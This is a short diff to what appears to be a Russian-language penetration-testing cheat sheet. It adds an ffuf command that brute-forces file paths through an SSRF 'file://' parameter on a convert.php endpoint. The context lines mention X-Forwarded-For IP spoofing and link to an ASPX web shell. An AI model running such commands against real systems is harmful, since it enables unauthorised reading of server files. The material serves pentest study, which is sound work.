@@ -80,4 +80,7 @@ https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
  # Смена IP при запрсе 
 
  	X-Forwarded-For: 1
-  
+
+# Брут файловой системы чере ssrf
+
+	ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018
